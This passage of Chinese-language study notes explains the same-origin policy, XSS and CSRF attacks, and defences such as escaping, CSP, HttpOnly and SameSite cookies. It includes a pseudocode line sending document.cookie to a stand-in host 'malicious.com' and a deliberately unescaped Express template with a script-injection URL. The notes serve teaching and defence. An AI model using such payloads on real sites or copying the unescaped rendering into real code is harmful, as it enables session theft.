在使用过程中所遇到的坑吗？其中第一个坑就是在默认情况下不能访问跨域的资源。</p><h3 id="安全和便利性的权衡"><a href="#安全和便利性的权衡" class="headerlink" title="安全和便利性的权衡"></a>安全和便利性的权衡</h3><p>我们了解了同源策略会隔离不同源的 DOM、页面数据和网络通信，进而实现 Web 页面的安全性。</p><p>不过安全性和便利性是相互对立的，让不同的源之间绝对隔离，无疑是最安全的措施，但这也会使得 Web 项目难以开发和使用。因此我们就要在这之间做出权衡，出让一些安全性来满足灵活性；而出让安全性又带来了很多安全问题，最典型的是 XSS 攻击和 CSRF 攻击，这两种攻击我们会在后续两篇文章中再做介绍，本文我们只聊浏览器出让了同源策略的哪些安全性。</p><h4 id="1-页面中可以嵌入第三方资源"><a href="#1-页面中可以嵌入第三方资源" class="headerlink" title="1. 页面中可以嵌入第三方资源"></a>1. 页面中可以嵌入第三方资源</h4><p>我们在文章开头提到过，Web 世界是开放的，可以接入任何资源，而同源策略要让一个页面的所有资源都来自于同一个源，也就是要将该页面的所有 HTML 文件、JavaScript 文件、CSS 文件、图片等资源都部署在同一台服务器上，这无疑违背了 Web 的初衷，也带来了诸多限制。比如将不同的资源部署到不同的 CDN 上时，CDN 上的资源就部署在另外一个域名上，因此我们就需要同源策略对页面的引用资源开一个“口子”，让其任意引用外部文件。</p><p>所以最初的浏览器都是支持外部引用资源文件的，不过这也带来了很多问题。之前在开发浏览器的时候，遇到最多的一个问题是浏览器的首页内容会被一些恶意程序劫持，劫持的途径很多，其中最常见的是恶意程序通过各种途径往 HTML 文件中插入恶意脚本。</p><p>比如，恶意程序在 HTML 文件内容中插入如下一段 JavaScript 代码：</p><p><img src="C:\Users\24657\AppData\Roaming\Typora\typora-user-images\image-20221014224101529.png" alt="image-20221014224101529"></p><p>当这段 HTML 文件的数据被送达浏览器时，浏览器是无法区分被插入的文件是恶意的还是正常的，这样恶意脚本就寄生在页面之中，当页面启动时，它可以修改用户的搜索结果、改变一些内容的连接指向，等等。</p><p>除此之外，它还能将页面的的敏感数据，如 Cookie、IndexDB、LoacalStorage 等数据通过 XSS 的手段发送给服务器。具体来讲就是，当你不小心点击了页面中的一个恶意链接时，恶意 JavaScript 代码可以读取页面数据并将其发送给服务器，如下面这段伪代码：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">function onClick()&#123;</span><br><span class="line">  let url = `http://malicious.com?cookie = $&#123;document.cookie&#125;`</span><br><span class="line">  open(url)</span><br><span class="line">&#125;</span><br><span class="line">onClick()</span><br></pre></td></tr></table></figure><p>在这段代码中，恶意脚本读取 Cookie 数据，并将其作为参数添加至恶意站点尾部，当打开该恶意页面时，恶意服务器就能接收到当前用户的 Cookie 信息。</p><p>以上就是一个非常典型的 XSS 攻击。为了解决 XSS 攻击，浏览器中引入了内容安全策略，称为 CSP。<strong>CSP 的核心思想是让服务器决定浏览器能够加载哪些资源，让服务器决定浏览器是否能够执行内联 JavaScript 代码</strong>。通过这些手段就可以大大减少 XSS 攻击。</p><h4 id="2-跨域资源共享和跨文档消息机制"><a href="#2-跨域资源共享和跨文档消息机制" class="headerlink" title="2. 跨域资源共享和跨文档消息机制"></a>2. 跨域资源共享和跨文档消息机制</h4><p>默认情况下，如果打开极客邦的官网页面，在官网页面中通过 XMLHttpRequest 或者 Fetch 来请求 InfoQ 中的资源，这时同源策略会阻止其向 InfoQ 发出请求，这样会大大制约我们的生产力。</p><p>为了解决这个问题，我们引入了<strong>跨域资源共享（CORS）</strong>，使用该机制可以进行跨域访问控制，从而使跨域数据传输得以安全进行。</p><p>在介绍同源策略时，我们说明了如果两个页面不是同源的，则无法相互操纵 DOM。不过在实际应用中，经常需要两个不同源的 DOM 之间进行通信，于是浏览器中又引入了<strong>跨文档消息机制</strong>，可以通过 window.postMessage 的 JavaScript 接口来和不同源的 DOM 进行通信。</p><h3 id="总结-31"><a href="#总结-31" class="headerlink" title="总结"></a>总结</h3><p>好了，今天就介绍到这里，下面我来总结下本文的主要内容。</p><p>同源策略会隔离不同源的 DOM、页面数据和网络通信，进而实现 Web 页面的安全性。</p><p>不过鱼和熊掌不可兼得，要绝对的安全就要牺牲掉便利性，因此我们要在这二者之间做权衡，找到中间的一个平衡点，也就是目前的页面安全策略原型。总结起来，它具备以下三个特点：</p><ol><li>页面中可以引用第三方资源，不过这也暴露了很多诸如 XSS 的安全问题，因此又在这种开放的基础之上引入了 CSP 来限制其自由程度。</li><li>使用 XMLHttpRequest 和 Fetch 都是无法直接进行跨域请求的，因此浏览器又在这种严格策略的基础之上引入了跨域资源共享策略，让其可以安全地进行跨域操作。</li><li>两个不同源的 DOM 是不能相互操纵的，因此，浏览器中又实现了跨文档消息机制，让其可以比较安全地通信。</li></ol><h2 id="2-跨站脚本攻击（XSS）：为什么-Cookie-中有-HttpOnly"><a href="#2-跨站脚本攻击（XSS）：为什么-Cookie-中有-HttpOnly" class="headerlink" title="2. 跨站脚本攻击（XSS）：为什么 Cookie 中有 HttpOnly"></a>2. 跨站脚本攻击（XSS）：为什么 Cookie 中有 HttpOnly</h2><p>通过<a href="https://time.geekbang.org/column/article/151370">上篇文章</a>的介绍，我们知道了同源策略可以隔离各个站点之间的 DOM 交互、页面数据和网络通信，虽然严格的同源策略会带来更多的安全，但是也束缚了 Web。这就需要在安全和自由之间找到一个平衡点，所以我们默认页面中可以引用任意第三方资源，然后又引入 CSP 策略来加以限制；默认 XMLHttpRequest 和 Fetch 不能跨站请求资源，然后又通过 CORS 策略来支持其跨域。</p><p>不过支持页面中的第三方资源引用和 CORS 也带来了很多安全问题，其中最典型的就是 XSS 攻击。</p><h3 id="什么是-XSS-攻击"><a href="#什么是-XSS-攻击" class="headerlink" title="什么是 XSS 攻击"></a>什么是 XSS 攻击</h3><p>XSS 全称是 Cross Site Scripting，为了与“CSS”区分开来，故简称 XSS，翻译过来就是“跨站脚本”。XSS 攻击是指黑客往 HTML 文件中或者 DOM 中注入恶意脚本，从而在用户浏览页面时利用注入的恶意脚本对用户实施攻击的一种手段。</p><p>最开始的时候，这种攻击是通过跨域来实现的，所以叫“跨域脚本”。但是发展到现在，往 HTML 文件中注入恶意代码的方式越来越多了，所以是否跨域注入脚本已经不是唯一的注入手段了，但是 XSS 这个名字却一直保留至今。</p><p>当页面被注入了恶意 JavaScript 脚本时，浏览器无法区分这些脚本是被恶意注入的还是正常的页面内容，所以恶意注入 JavaScript 脚本也拥有所有的脚本权限。下面我们就来看看，如果页面被注入了恶意 JavaScript 脚本，恶意脚本都能做哪些事情。</p><ul><li>可以<strong>窃取 Cookie 信息</strong>。恶意 JavaScript 可以通过“document.cookie”获取 Cookie 信息，然后通过 XMLHttpRequest 或者 Fetch 加上 CORS 功能将数据发送给恶意服务器；恶意服务器拿到用户的 Cookie 信息之后，就可以在其他电脑上模拟用户的登录，然后进行转账等操作。</li><li>可以<strong>监听用户行为</strong>。恶意 JavaScript 可以使用“addEventListener”接口来监听键盘事件，比如可以获取用户输入的信用卡等信息，将其发送到恶意服务器。黑客掌握了这些信息之后，又可以做很多违法的事情。</li><li>可以通过<strong>修改 DOM</strong>伪造假的登录窗口，用来欺骗用户输入用户名和密码等信息。</li><li>还可以<strong>在页面内生成浮窗广告</strong>，这些广告会严重地影响用户体验。</li></ul><p>除了以上几种情况外，恶意脚本还能做很多其他的事情，这里就不一一介绍了。总之，如果让页面插入了恶意脚本，那么就相当于把我们页面的隐私数据和行为完全暴露给黑客了。</p><h3 id="恶意脚本是怎么注入的"><a href="#恶意脚本是怎么注入的" class="headerlink" title="恶意脚本是怎么注入的"></a>恶意脚本是怎么注入的</h3><p>现在我们知道了页面中被注入恶意的 JavaScript 脚本是一件非常危险的事情，所以网站开发者会尽可能地避免页面中被注入恶意脚本。要想避免站点被注入恶意脚本，就要知道有哪些常见的注入方式。通常情况下，主要有<strong>存储型 XSS 攻击、反射型 XSS 攻击</strong>和<strong>基于 DOM 的 XSS 攻击</strong>三种方式来注入恶意脚本。</p><h4 id="1-存储型-XSS-攻击"><a href="#1-存储型-XSS-攻击" class="headerlink" title="1. 存储型 XSS 攻击"></a>1. 存储型 XSS 攻击</h4><p>我们先来看看存储型 XSS 攻击是怎么向 HTML 文件中注入恶意脚本的，你可以参考下图：属性？</p><p><img src="C:\Users\24657\AppData\Roaming\Typora\typora-user-images\image-20221014224137215.png" alt="image-20221014224137215"></p><p>通过上图，我们可以看出存储型 XSS 攻击大致需要经过如下步骤：</p><ul><li>首先黑客利用站点漏洞将一段恶意 JavaScript 代码提交到网站的数据库中；</li><li>然后用户向网站请求包含了恶意 JavaScript 脚本的页面；</li><li>当用户浏览该页面的时候，恶意脚本就会将用户的 Cookie 信息等数据上传到服务器。</li></ul><p>下面我们来看个例子，2015 年喜马拉雅就被曝出了存储型 XSS 漏洞。起因是在用户设置专辑名称时，服务器对关键字过滤不严格，比如可以将专辑名称设置为一段 JavaScript，如下图所示：</p><p><img src="C:\Users\24657\AppData\Roaming\Typora\typora-user-images\image-20221014224146610.png" alt="image-20221014224146610"></p><p>当黑客将专辑名称设置为一段 JavaScript 代码并提交时，喜马拉雅的服务器会保存该段 JavaScript 代码到数据库中。然后当用户打开黑客设置的专辑时，这段代码就会在用户的页面里执行（如下图），这样就可以获取用户的 Cookie 等数据信息。</p><p><img src="C:\Users\24657\AppData\Roaming\Typora\typora-user-images\image-20221014224159721.png" alt="image-20221014224159721"></p><p>当用户打开黑客设置的专辑页面时，服务器也会将这段恶意 JavaScript 代码返回给用户，因此这段恶意脚本就在用户的页面中执行了。</p><p>恶意脚本可以通过 XMLHttpRequest 或者 Fetch 将用户的 Cookie 数据上传到黑客的服务器，如下图所示：</p><p><img src="C:\Users\24657\AppData\Roaming\Typora\typora-user-images\image-20221014224211027.png" alt="image-20221014224211027"></p><p>黑客拿到了用户 Cookie 信息之后，就可以利用 Cookie 信息在其他机器上登录该用户的账号（如下图），并利用用户账号进行一些恶意操作。</p><p><img src="C:\Users\24657\AppData\Roaming\Typora\typora-user-images\image-20221014224220005.png" alt="image-20221014224220005"></p><p>以上就是存储型 XSS 攻击的一个典型案例，这是乌云网在 2015 年曝出来的，虽然乌云网由于某些原因被关停了，但是你依然可以通过<a href="https://shuimugan.com/bug/view?bug_no=138479">这个站点</a>来查看乌云网的一些备份信息。</p><h4 id="2-反射型-XSS-攻击"><a href="#2-反射型-XSS-攻击" class="headerlink" title="2. 反射型 XSS 攻击"></a>2. 反射型 XSS 攻击</h4><p>在一个反射型 XSS 攻击过程中，恶意 JavaScript 脚本属于用户发送给网站请求中的一部分，随后网站又把恶意 JavaScript 脚本返回给用户。当恶意 JavaScript 脚本在用户页面中被执行时，黑客就可以利用该脚本做一些恶意操作。</p><p>这样讲有点抽象，下面我们结合一个简单的 Node 服务程序来看看什么是反射型 XSS。首先我们使用 Node 来搭建一个简单的页面环境，搭建好的服务代码如下所示：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">var express = require(&#x27;express&#x27;);</span><br><span class="line">var router = express.Router();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">/* GET home page. */</span><br><span class="line">router.get(&#x27;/&#x27;, function(req, res, next) &#123;</span><br><span class="line">  res.render(&#x27;index&#x27;, &#123; title: &#x27;Express&#x27;,xss:req.query.xss &#125;);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">module.exports = router;</span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">  &lt;title&gt;&lt;%= title %&gt;&lt;/title&gt;</span><br><span class="line">  &lt;link rel=&#x27;stylesheet&#x27; href=&#x27;/stylesheets/style.css&#x27; /&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">  &lt;h1&gt;&lt;%= title %&gt;&lt;/h1&gt;</span><br><span class="line">  &lt;p&gt;Welcome to &lt;%= title %&gt;&lt;/p&gt;</span><br><span class="line">  &lt;div&gt;</span><br><span class="line">      &lt;%- xss %&gt;</span><br><span class="line">  &lt;/div&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p>上面这两段代码，第一段是路由，第二段是视图，作用是将 URL 中 xss 参数的内容显示在页面。我们可以在本地演示下，比如打开<code>http://localhost:3000/?xss=123</code>这个链接，这样在页面中展示就是“123”了（如下图），是正常的，没有问题的。</p><p><img src="C:\Users\24657\AppData\Roaming\Typora\typora-user-images\image-20221014224231770.png" alt="image-20221014224231770"></p><p>但当打开<code>http://localhost:3000/?xss=&lt;script&gt;alert(&#39;你被xss攻击了&#39;)&lt;/script&gt;</code>这段 URL 时，其结果如下图所示：</p><p><img src="C:\Users\24657\AppData\Roaming\Typora\typora-user-images\image-20221014224239898.png" alt="image-20221014224239898"></p><p>通过这个操作，我们会发现用户将一段含有恶意代码的请求提交给 Web 服务器，Web 服务器接收到请求时，又将恶意代码反射给了浏览器端，这就是反射型 XSS 攻击。在现实生活中，黑客经常会通过 QQ 群或者邮件等渠道诱导用户去点击这些恶意链接，所以对于一些链接我们一定要慎之又慎。</p><p>另外需要注意的是，<strong>Web 服务器不会存储反射型 XSS 攻击的恶意脚本，这是和存储型 XSS 攻击不同的地方</strong>。</p><h4 id="3-基于-DOM-的-XSS-攻击"><a href="#3-基于-DOM-的-XSS-攻击" class="headerlink" title="3. 基于 DOM 的 XSS 攻击"></a>3. 基于 DOM 的 XSS 攻击</h4><p>基于 DOM 的 XSS 攻击是不牵涉到页面 Web 服务器的。具体来讲，黑客通过各种手段将恶意脚本注入用户的页面中，比如通过网络劫持在页面传输过程中修改 HTML 页面的内容，这种劫持类型很多，有通过 WiFi 路由器劫持的，有通过本地恶意软件来劫持的，它们的共同点是在 Web 资源传输过程或者在用户使用页面的过程中修改 Web 页面的数据。</p><h3 id="如何阻止-XSS-攻击"><a href="#如何阻止-XSS-攻击" class="headerlink" title="如何阻止 XSS 攻击"></a>如何阻止 XSS 攻击</h3><p>我们知道存储型 XSS 攻击和反射型 XSS 攻击都是需要经过 Web 服务器来处理的，因此可以认为这两种类型的漏洞是服务端的安全漏洞。而基于 DOM 的 XSS 攻击全部都是在浏览器端完成的，因此基于 DOM 的 XSS 攻击是属于前端的安全漏洞。</p><p>但无论是何种类型的 XSS 攻击，它们都有一个共同点，那就是首先往浏览器中注入恶意脚本，然后再通过恶意脚本将用户信息发送至黑客部署的恶意服务器上。</p><p>所以要阻止 XSS 攻击，我们可以通过阻止恶意 JavaScript 脚本的注入和恶意消息的发送来实现。</p><p>接下来我们就来看看一些常用的阻止 XSS 攻击的策略。</p><h4 id="1-服务器对输入脚本进行过滤或转码"><a href="#1-服务器对输入脚本进行过滤或转码" class="headerlink" title="1. 服务器对输入脚本进行过滤或转码"></a>1. 服务器对输入脚本进行过滤或转码</h4><p>不管是反射型还是存储型 XSS 攻击，我们都可以在服务器端将一些关键的字符进行转码，比如最典型的：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">code:&lt;script&gt;alert(&#x27;你被 xss 攻击了&#x27;)&lt;/script&gt;</span><br><span class="line">复制代码</span><br></pre></td></tr></table></figure><p>这段代码过滤后，只留下了：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">code:</span><br><span class="line">复制代码</span><br></pre></td></tr></table></figure><p>这样，当用户再次请求该页面时，由于<code>&lt;script&gt;</code>标签的内容都被过滤了，所以这段脚本在客户端是不可能被执行的。</p><p>除了过滤之外，服务器还可以对这些内容进行转码，还是上面那段代码，经过转码之后，效果如下所示：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">code:&amp;lt;script&amp;gt;alert(&amp;#39; 你被 xss 攻击了 &amp;#39;)&amp;lt;/script&amp;gt;</span><br><span class="line">复制代码</span><br></pre></td></tr></table></figure><p>经过转码之后的内容，如<code>&lt;script&gt;</code>标签被转换为<code>&lt;script&gt;</code>，因此即使这段脚本返回给页面，页面也不会执行这段脚本。</p><h4 id="2-充分利用-CSP"><a href="#2-充分利用-CSP" class="headerlink" title="2. 充分利用 CSP"></a>2. 充分利用 CSP</h4><p>虽然在服务器端执行过滤或者转码可以阻止 XSS 攻击的发生，但完全依靠服务器端依然是不够的，我们还需要把 CSP 等策略充分地利用起来，以降低 XSS 攻击带来的风险和后果。</p><p>实施严格的 CSP 可以有效地防范 XSS 攻击，具体来讲 CSP 有如下几个功能：</p><ul><li>限制加载其他域下的资源文件，这样即使黑客插入了一个 JavaScript 文件，这个 JavaScript 文件也是无法被加载的；</li><li>禁止向第三方域提交数据，这样用户数据也不会外泄；</li><li>禁止执行内联脚本和未授权的脚本；</li><li>还提供了上报机制，这样可以帮助我们尽快发现有哪些 XSS 攻击，以便尽快修复问题。</li></ul><p>因此，利用好 CSP 能够有效降低 XSS 攻击的概率。</p><h4 id="3-使用-HttpOnly-属性"><a href="#3-使用-HttpOnly-属性" class="headerlink" title="3. 使用 HttpOnly 属性"></a>3. 使用 HttpOnly 属性</h4><p>由于很多 XSS 攻击都是来盗用 Cookie 的，因此还可以通过使用 HttpOnly 属性来保护我们 Cookie 的安全。</p><p>通常服务器可以将某些 Cookie 设置为 HttpOnly 标志，HttpOnly 是服务器通过 HTTP 响应头来设置的，下面是打开 Google 时，HTTP 响应头中的一段：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">set-cookie: NID=189=M8q2FtWbsR8RlcldPVt7qkrqR38LmFY9jUxkKo3-4Bi6Qu_ocNOat7nkYZUTzolHjFnwBw0izgsATSI7TZyiiiaV94qGh-BzEYsNVa7TZmjAYTxYTOM9L_-0CN9ipL6cXi8l6-z41asXtm2uEwcOC5oh9djkffOMhWqQrlnCtOI; expires=Sat, 18-Apr-2020 06:52:22 GMT; path=/; domain=.google.com; HttpOnly</span><br><span class="line">复制代码</span><br></pre></td></tr></table></figure><p>我们可以看到，set-cookie 属性值最后使用了 HttpOnly 来标记该 Cookie。顾名思义，使用 HttpOnly 标记的 Cookie 只能使用在 HTTP 请求过程中，所以无法通过 JavaScript 来读取这段 Cookie。我们还可以通过 Chrome 开发者工具来查看哪些 Cookie 被标记了 HttpOnly，如下图：</p><p><img src="C:\Users\24657\AppData\Roaming\Typora\typora-user-images\image-20221014224251293.png" alt="image-20221014224251293"></p><p>从图中可以看出，NID 这个 Cookie 的 HttpOlny 属性是被勾选上的，所以 NID 的内容是无法通过 document.cookie 是来读取的。</p><p>由于 JavaScript 无法读取设置了 HttpOnly 的 Cookie 数据，所以即使页面被注入了恶意 JavaScript 脚本，也是无法获取到设置了 HttpOnly 的数据。因此一些比较重要的数据我们建议设置 HttpOnly 标志。</p><h3 id="总结-32"><a href="#总结-32" class="headerlink" title="总结"></a>总结</h3><p>好了，今天我们就介绍到这里，下面我来总结下本文的主要内容。</p><p>XSS 攻击就是黑客往页面中注入恶意脚本，然后将页面的一些重要数据上传到恶意服务器。常见的三种 XSS 攻击模式是存储型 XSS 攻击、反射型 XSS 攻击和基于 DOM 的 XSS 攻击。</p><p>这三种攻击方式的共同点是都需要往用户的页面中注入恶意脚本，然后再通过恶意脚本将用户数据上传到黑客的恶意服务器上。而三者的不同点在于注入的方式不一样，有通过服务器漏洞来进行注入的，还有在客户端直接注入的。</p><p>针对这些 XSS 攻击，主要有三种防范策略，第一种是通过服务器对输入的内容进行过滤或者转码，第二种是充分利用好 CSP，第三种是使用 HttpOnly 来保护重要的 Cookie 信息。</p><p>当然除了以上策略之外，我们还可以通过添加验证码防止脚本冒充用户提交危险操作。而对于一些不受信任的输入，还可以限制其输入长度，这样可以增大 XSS 攻击的难度。</p><h2 id="3-CSRF-攻击：陌生链接不要随便点"><a href="#3-CSRF-攻击：陌生链接不要随便点" class="headerlink" title="3. CSRF 攻击：陌生链接不要随便点"></a>3. CSRF 攻击：陌生链接不要随便点</h2><p>中我们讲到了 XSS 攻击，XSS 的攻击方式是黑客往用户的页面中注入恶意脚本，然后再通过恶意脚本将用户页面的数据上传到黑客的服务器上，最后黑客再利用这些数据进行一些恶意操作。XSS 攻击能够带来很大的破坏性，不过另外一种类型的攻击也不容忽视，它就是我们今天要聊的 CSRF 攻击。</p><p>相信你经常能听到的一句话：“别点那个链接，小心有病毒！”点击一个链接怎么就能染上病毒了呢？</p><p>我们结合一个真实的关于 CSRF 攻击的典型案例来分析下，在 2007 年的某一天，David 无意间打开了 Gmail 邮箱中的一份邮件，并点击了该邮件中的一个链接。过了几天，David 就发现他的域名被盗了。不过几经周折，David 还是要回了他的域名，也弄清楚了他的域名之所以被盗，就是因为无意间点击的那个链接。</p><p>那 David 的域名是怎么被盗的呢？</p><p>我们结合下图来分析下 David 域名的被盗流程：</p><p><img src="http://blog.poetries.top/img-repo/2019/11/101.png" alt="img"></p><ul><li>首先 David 发起登录 Gmail 邮箱请求，然后 Gmail 服务器返回一些登录状态给 David 的浏览器，这些信息包括了 Cookie、Session 等，这样在 David 的浏览器中，Gmail 邮箱就处于登录状态了。</li><li>接着黑客通过各种手段引诱 David 去打开他的链接，比如 hacker.com，然后在 hacker.com 页面中，黑客编写好了一个邮件过滤器，并通过 Gmail 提供的 HTTP 设置接口设置好了新的邮件过滤功能，该过滤器会将 David 所有的邮件都转发到黑客的邮箱中。</li><li>最后的事情就很简单了，因为有了 David 的邮件内容，所以黑客就可以去域名服务商那边重置 David 域名账户的密码，重置好密码之后，就可以将其转出到黑客的账户了。</li></ul><p>以上就是 David 的域名被盗的完整过程，其中前两步就是我们今天要聊的 CSRF 攻击。David 在要回了他的域名之后，也将整个攻击过程分享到他的站点上了，如果你感兴趣的话，可以参考</p><h3 id="什么是-csrf-攻击什么是-CSRF-攻击"><a href="#什么是-csrf-攻击什么是-CSRF-攻击" class="headerlink" title="什么是-csrf-攻击什么是 CSRF 攻击"></a>什么是-csrf-攻击什么是 CSRF 攻击</h3><p>CSRF 英文全称是 Cross-site request forgery，所以又称为“跨站请求伪造”，是指黑客引诱用户打开黑客的网站，在黑客的网站中，利用用户的登录状态发起的跨站请求。简单来讲，<strong>CSRF 攻击就是黑客利用了用户的登录状态，并通过第三方的站点来做一些坏事</strong></p><p>通常当用户打开了黑客的页面后，黑客有三种方式去实施 CSRF 攻击。</p><p>下面我们以极客时间官网为例子，来分析这三种攻击方式都是怎么实施的。这里假设极客时间具有转账功能，可以通过 POST 或 Get 来实现转账，转账接口如下所示：</p><p><img src="http://blog.poetries.top/img-repo/2019/11/102.png" alt="img"></p><p>有了上面的转账接口，我们就可以来模拟 CSRF 攻击了。</p><h3 id="自动发起-Get-请求"><a href="#自动发起-Get-请求" class="headerlink" title="自动发起 Get 请求"></a>自动发起 Get 请求</h3><p>黑客最容易实施的攻击方式是自动发起 Get 请求，具体攻击方式你可以参考下面这段代码：</p><p><img src="http://blog.poetries.top/img-repo/2019/11/103.png" alt="img"></p><p>这是黑客页面的 HTML 代码，在这段代码中，黑客将转账的请求接口隐藏在 img 标签内，欺骗浏览器这是一张图片资源。当该页面被加载时，浏览器会自动发起 img 的资源请求，如果服务器没有对该请求做判断的话，那么服务器就会认为该请求是一个转账请求，于是用户账户上的 100 极客币就被转移到黑客的账户上去了。</p><h3 id="自动发起-POST-请求"><a href="#自动发起-POST-请求" class="headerlink" title="自动发起 POST 请求"></a>自动发起 POST 请求</h3><p>除了自动发送 Get 请求之外，有些服务器的接口是使用 POST 方法的，所以黑客还需要在他的站点上伪造 POST 请求，当用户打开黑客的站点时，是自动提交 POST 请求，具体的方式你可以参考下面示例代码：</p><p><img src="http://blog.poetries.top/img-repo/2019/11/104.png" alt="img"></p><p>在这段代码中，我们可以看到黑客在他的页面中构建了一个隐藏的表单，该表单的内容就是极客时间的转账接口。当用户打开该站点之后，这个表单会被自动执行提交；当表单被提交之后，服务器就会执行转账操作。因此使用构建自动提交表单这种方式，就可以自动实现跨站点 POST 数据提交。</p><h3 id="引诱用户点击链接"><a href="#引诱用户点击链接" class="headerlink" title="引诱用户点击链接"></a>引诱用户点击链接</h3><p>除了自动发起 Get 和 Post 请求之外，还有一种方式是诱惑用户点击黑客站点上的链接，这种方式通常出现在论坛或者恶意邮件上。黑客会采用很多方式去诱惑用户点击链接，示例代码如下所示：</p><p><img src="http://blog.poetries.top/img-repo/2019/11/105.png" alt="img"></p><p>这段黑客站点代码，页面上放了一张美女图片，下面放了图片下载地址，而这个下载地址实际上是黑客用来转账的接口，一旦用户点击了这个链接，那么他的极客币就被转到黑客账户上了。</p><p>以上三种就是黑客经常采用的攻击方式。如果当用户登录了极客时间，以上三种 CSRF 攻击方式中的任何一种发生时，那么服务器都会将一定金额的极客币发送到黑客账户。</p><p>到这里，相信你已经知道什么是 CSRF 攻击了。和 XSS 不同的是，CSRF 攻击不需要将恶意代码注入用户的页面，仅仅是利用服务器的漏洞和用户的登录状态来实施攻击</p><h3 id="如何防止-CSRF-攻击"><a href="#如何防止-CSRF-攻击" class="headerlink" title="如何防止 CSRF 攻击"></a>如何防止 CSRF 攻击</h3><p>了解了 CSRF 攻击的一些手段之后，我们再来看看 CSRF 攻击的一些“特征”，然后根据这些“特征”分析下如何防止 CSRF 攻击。下面是我总结的发起 CSRF 攻击的三个必要条件：</p><ul><li>第一个，目标站点一定要有 CSRF 漏洞；</li><li>第二个，用户要登录过目标站点，并且在浏览器上保持有该站点的登录状态；</li><li>第三个，需要用户打开一个第三方站点，可以是黑客的站点，也可以是一些论坛。</li></ul><p>满足以上三个条件之后，黑客就可以对用户进行 CSRF 攻击了。这里还需要额外注意一点，与 XSS 攻击不同，CSRF 攻击不会往页面注入恶意脚本，因此黑客是无法通过 CSRF 攻击来获取用户页面数据的；其最关键的一点是要能找到服务器的漏洞，所以说对于 CSRF 攻击我们主要的防护手段是提升服务器的安全性。</p><p>要让服务器避免遭受到 CSRF 攻击，通常有以下几种途径。</p><h4 id="1-充分利用好-Cookie-的-SameSite-属性"><a href="#1-充分利用好-Cookie-的-SameSite-属性" class="headerlink" title="1. 充分利用好 Cookie 的 SameSite 属性"></a>1. 充分利用好 Cookie 的 SameSite 属性</h4><p>通过上面的介绍，相信你已经知道了黑客会利用用户的登录状态来发起 CSRF 攻击，而<strong>Cookie 正是浏览器和服务器之间维护登录状态的一个关键数据</strong>，因此要阻止 CSRF 攻击，我们首先就要考虑在 Cookie 上来做文章。</p><p>通常 CSRF 攻击都是从第三方站点发起的，要防止 CSRF 攻击，我们最好能实现从第三方站点发送请求时禁止 Cookie 的发送，因此在浏览器通过不同来源发送 HTTP 请求时，有如下区别：</p><ul><li>如果是从第三方站点发起的请求，那么需要浏览器禁止发送某些关键 Cookie 数据到服务器；</li><li>如果是同一个站点发起的请求，那么就需要保证 Cookie 数据正常发送。</li></ul><p>而我们要聊的 Cookie 中的 SameSite 属性正是为了解决这个问题的，通过使用 SameSite 可以有效地降低 CSRF 攻击的风险。</p><p>那 SameSite 是怎么防止 CSRF 攻击的呢？</p><p>在 HTTP 响应头中，通过 set-cookie 字段设置 Cookie 时，可以带上 SameSite 选项，如下：</p><p><img src="http://blog.poetries.top/img-repo/2019/11/106.png" alt="img"></p><p><strong>SameSite 选项通常有 Strict、Lax 和 None 三个值。</strong></p><ul><li>Strict 最为严格。如果 SameSite 的值是 Strict，那么浏览器会完全禁止第三方 Cookie。简言之，如果你从极客时间的页面中访问 InfoQ 的资源，而 InfoQ 的某些 Cookie 设置了 SameSite &#x3D; Strict 的话，那么这些 Cookie 是不会被发送到 InfoQ 的服务器上的。只有你从 InfoQ 的站点去请求 InfoQ 的资源时，才会带上这些 Cookie。</li><li>Lax 相对宽松一点。在跨站点的情况下，从第三方站点的链接打开和从第三方站点提交 Get 方式的表单这两种方式都会携带 Cookie。但如果在第三方站点中使用 Post 方法，或者通过 img、iframe 等标签加载的 URL，这些场景都不会携带 Cookie。</li><li>而如果使用 None 的话，在任何情况下都会发送 Cookie 数据。</li></ul><blockquote><p>对于防范 CSRF 攻击，我们可以针对实际情况将一些关键的 Cookie 设置为 Strict 或者 Lax 模式，这样在跨站点请求时，这些关键的 Cookie 就不会被发送到服务器，从而使得黑客的 CSRF 攻击失效。</p></blockquote><h4 id="2-验证请求的来源站点"><a href="#2-验证请求的来源站点" class="headerlink" title="2. 验证请求的来源站点"></a>2. 验证请求的来源站点</h4><p>接着我们再来了解另外一种防止 CSRF 攻击的策略，那就是<strong>在服务器端验证请求来源的站点</strong>。由于 CSRF 攻击大多来自于第三方站点，因此服务器可以禁止来自第三方站点的请求。那么该怎么判断请求是否来自第三方站点呢？</p><p>这就需要介绍 HTTP 请求头中的 Referer 和 Origin 属性了。</p><p><strong>Referer 是 HTTP 请求头中的一个字段，记录了该 HTTP 请求的来源地址</strong>。比如我从极客时间的官网打开了 InfoQ 的站点，那么请求头中的 Referer 值是极客时间的 URL，如下图：</p><p><img src="http://blog.poetries.top/img-repo/2019/11/107.png" alt="img"></p><p>虽然可以通过 Referer 告诉服务器 HTTP 请求的来源，但是有一些场景是不适合将来源 URL 暴露给服务器的，因此浏览器提供给开发者一个选项，可以不用上传 Referer 值，具体可参考<strong>Referrer Policy</strong></p><p>但在服务器端验证请求头中的 Referer 并不是太可靠，因此标准委员会又制定了<strong>Origin 属性</strong>，在一些重要的场合，比如通过 XMLHttpRequest、Fecth 发起跨站请求或者通过 Post 方法发送请求时，都会带上 Origin 属性，如下图：</p><p><img src="http://blog.poetries.top/img-repo/2019/11/108.png" alt="img"></p><p>从上图可以看出，Origin 属性只包含了域名信息，并没有包含具体的 URL 路径，这是 Origin 和 Referer 的一个主要区别。在这里需要补充一点，Origin 的值之所以不包含详细路径信息，是有些站点因为安全考虑，不想把源站点的详细路径暴露给服务器。</p><p>因此，服务器的策略是优先判断 Origin，如果请求头中没有包含 Origin 